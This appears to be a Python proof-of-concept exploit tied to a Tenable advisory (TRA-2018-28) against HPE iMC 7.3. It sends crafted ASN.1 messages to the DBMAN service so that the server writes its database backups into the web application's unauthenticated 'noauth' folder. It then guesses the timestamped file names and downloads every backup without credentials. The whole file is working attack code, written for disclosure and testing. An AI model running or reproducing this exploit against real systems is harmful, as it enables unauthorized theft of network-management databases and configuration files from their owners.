from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import binascii
import socket, sys, os
import requests
from dateutil import parser,tz
from datetime import datetime,timedelta
import time
import argparse
import re

# http://tenable.com/security/research/tra-2018-28

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('backupDir', OctetString())
    )

class Dbman_Backup_Downloader(object):

    def __init__(self, target_ip, dbman_port, http_port, timezone):
        self.target_ip = target_ip
        self.dbman_port = dbman_port
        self.http_port = http_port
        self.timezone = timezone
        self.base_url = 'http://' + self.target_ip + ':' + str(self.http_port) + '/imc'
        self.ip_addr_prefix = ''
        self.datetime_str = ''

    def print_usage():
        print "Usage: python " + sys.argv[0] + " <ip> [port=2810]"
        sys.exit(0)

    def send_dbman_msg(self, opcode, msg):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_ip, self.dbman_port))

        encodedMsg = encoder.encode(msg, defMode=True)
        msgLen = len(encodedMsg)
        values = (opcode, msgLen, encodedMsg)
        s = struct.Struct(">ii%ds" % msgLen)
        packed_data = s.pack(*values)

        sock.send(packed_data)

        res = sock.recv(1024)
        if res is not None:
            print "Received 10002 response..."
        sock.close()

    def send_bak_config_file_req(self):
    	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_ip, self.dbman_port))

        packed_data = struct.pack(">i", 10000)
	sock.send(packed_data)

	res = sock.recv(1024)
	if res is not None:
            print "Received 10000 response..."
        sock.close()
  
    def trigger_backup(self):
        msg = DbmanMsg()
        msg['backupDir'] = "C:\\Program Files\\iMC\\client\\web\\apps\\imc\\noauth"
        self.send_dbman_msg(10002, msg)

    def get_server_datetime(self):
       r = requests.get(self.base_url, timeout=5)
       date = r.headers['date']
       utc_date = parser.parse(date) # will be UTC

       # convert to suspected time zone
       # note: this is the time zone of the iMC server
       from_zone = tz.tzutc()
       to_zone = tz.gettz(self.timezone)
       utc_date = utc_date.replace(tzinfo=from_zone)
       target_time = utc_date.astimezone(to_zone)

       return target_time

    def get_file_list(self):
        # this is the order in which the files were produced during testing
        return [
            self.ip_addr_prefix + '@aclm_db_imc_aclm_db_' + self.datetime_str + '_full.db',
            'plat_' + self.datetime_str + '.zip',
            self.ip_addr_prefix + '@config_db_imc_config_db_' + self.datetime_str + '_full.db',
            'icc_' + self.datetime_str + '.zip',
            self.ip_addr_prefix + '@invent_db_imc_inventory_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@icc_db_imc_icc_db_' + self.datetime_str + '_full.db',
            'perf_' + self.datetime_str + '.zip',
            self.ip_addr_prefix + '@perf_db_imc_perf_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@monitor_db_imc_monitor_db_' + self.datetime_str + '_full.db',
            'report_' + self.datetime_str + '.zip',
            'dbman_' + self.datetime_str + '.conf',
            'db_catalog_' + self.datetime_str + '.dat.ok',
            'db_catalog_' + self.datetime_str + '.dat',
            self.ip_addr_prefix + '@vxlan_db_imc_vxlan_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@vnm_db_imc_vnm_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@vlanm_db_vlan_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@syslog_db_imc_syslog_db_' + self.datetime_str + '_full.db',
            self.ip_addr_prefix + '@reportplat_db_reportplat_db_' + self.datetime_str + '_full.db'
        ]

    # this file happens to be created first
    def get_first_filename(self, ip, date):
        return ip + '@aclm_db_imc_aclm_db_' + date + '_full.db'

    def try_file_exists(self, filename):
        url = self.base_url + '/noAuth/' + filename
        print "Checking if file exists at '" + url + "'"
        r = requests.get(url, stream=False, timeout=5)
        return (r.status_code == 200)

    def try_download_file(self, filename):
        url = self.base_url + '/noAuth/' + filename
        r = requests.get(url, stream=True, timeout=5)
        if r.status_code != 200:
            return False
        else:
            # save to folder
            with open(self.datetime_str + '/' + filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            return True

    # this does not DOWNLOAD a file
    # instead it checks for existence 
    def get_file_name_conv(self, dt):
        # the timestamp on the filename may not be the same as ours
        # grabbed from the HTTP response
        exists = False
        sec = -1
        tries = 0
        max_try = 10
        while not exists and tries < max_try: 
            sec += 1
            tries += 1
            dt += timedelta(seconds=sec) # add 1 sec to datetime
            # format datetime string
            # YYYYMMDD_HHMMSS
            dt_str = dt.strftime("%Y%m%d_%H%M%S")

            # first try with 127.0.0.1, then try with ip
            ip_list = ['127.0.0.1', self.target_ip] 
            for ip_addr in ip_list:
                filename = self.get_first_filename(ip_addr, dt_str)
                exists = self.try_file_exists(filename)
                if exists:
                    print "Got file: " + filename
                    # use these params for further processing
                    self.ip_addr_prefix = ip_addr
                    self.datetime_str = dt_str
                    return True
        return False


    def download_file(self, filename):
        downloaded = False
        sec = 0
        tries = 1
        max_tries = 15
        while not downloaded and tries <= max_tries: 
            sec += 1
            print "  Waiting for %d sec" % sec
            time.sleep(sec) 
            sys.stdout.write("  Trying to download file: " + filename + " ... Attempt %d of %d" % (tries, max_tries) )
            downloaded = self.try_download_file(filename)
            tries += 1
            if not downloaded:
                sys.stdout.write('\n')
        
        if downloaded:
            print " ... OK!"
            return True
        else:
            return False

# MAIN

desc = '''This PoC targets HPE iMC 7.3 E0605. It has been tested against Windows 2008 R2 x64.

The goal of the script is to download backups produced by iMC, remotely, without authentication.

The following operations will be conducted: 
1) Determine system time of remote iMC web server (TCP port 8080 by default).
2) Trigger backup by communicating with DBMAN.exe (TCP port 2810 by default).
3) Try to figure out file naming convention used to create backups.
4) Download all files from web server.
'''

arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-d', type=int, default=2810, help='DBMAN Port (Default: 2810)')
arg_parser.add_argument('-p', type=int, default=8080, help='HTTP Port (Default: 8080)')
arg_parser.add_argument('-tz', default='America/New_York', help='Timezone (Default: America/New_York) (See https://en.wikipedia.org/wiki/List_of_tz_database_time_zones)')
arg_parser.add_argument('-s', type=int, default=10, help='Number of seconds to wait to allow backups to be generated. This depends on how large they will be. (Default: 10 seconds)')

args = arg_parser.parse_args()

ip = args.t
dbman_port = args.d
http_port = args.p
timezone = args.tz

# validate some args
tz_pattern = ".*/.*"
match = re.match(tz_pattern, timezone)
if match is None:
    print "\nError: Timezone is invalid.\n"
    arg_parser.print_help()
    sys.exit(1)

ip_pattern = "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"
match = re.match(ip_pattern, ip)
if match is None:
    print "\nError: IP Address is invalid.\n"
    arg_parser.print_help()
    sys.exit(1)

print "Target: "
print "  - IP Addr= " + ip
print "  - Dbman port = " + str(dbman_port)
print "  - Webapp port = " + str(http_port)
print "  - Timezone = " + timezone
print "\n"

downloader = Dbman_Backup_Downloader(ip, dbman_port, http_port, timezone)


# grab timestamp from HTTP server
print "Grabbing server datetime stamp ..."
dt = downloader.get_server_datetime()

# send dbman 10000
print "Sending request to configure backups ..."
downloader.send_bak_config_file_req()

# send dbman 10002 request to trigger backup
print "Sending request to trigger backup ..."
downloader.trigger_backup()

# give the first file a chance to be created
# before we attempt to download it
# we will try up to 6 times (1 minute if 10 second delay)
tries = 1
max_tries = 6
conv = False
while not conv and tries <= max_tries:
    pad = args.s # seconds
    print "Attempt %d of %d" % (tries, max_tries) + " to determine file naming convention"
    print "Waiting " + str(pad) + " seconds to allow for file creation..."
    time.sleep(pad)

    # - all file names contain a timestamp
    # - some files are prefixed with an IP address
    #
    # the timestamp on the filename may not be the same as ours
    # grabbed from the HTTP response
    #
    # let's guess the naming convention
    conv = downloader.get_file_name_conv(dt)
    tries += 1

if conv == False:
    print "Unable to determine naming convention. Retry in a few min. Perhaps a backup was already in progress."
    sys.exit(1)

# make directory for downloads
os.mkdir(downloader.datetime_str)

# otherwise, we have the convention.
# download the rest of the files
# conv == (ip, date)
file_names = downloader.get_file_list()
successful_downloads = []
did_not_download = []
file_num = 1
for filename in file_names:
    print "*** File %d of %d ***" % (file_num, len(file_names))
    if downloader.download_file(filename):
        successful_downloads.append(filename)
    else:
        did_not_download.append(filename)
    file_num += 1

if len(successful_downloads) > 0:
    print "\nThe following files were downloaded to the '" + downloader.datetime_str + "' directory:"
    for filename in successful_downloads:
        print " - " + filename

if len(did_not_download) > 0:
    print "\nThese files were not downloaded successfully: "
    for filename in did_not_download:
        print " - " + filename

print "\nDone."
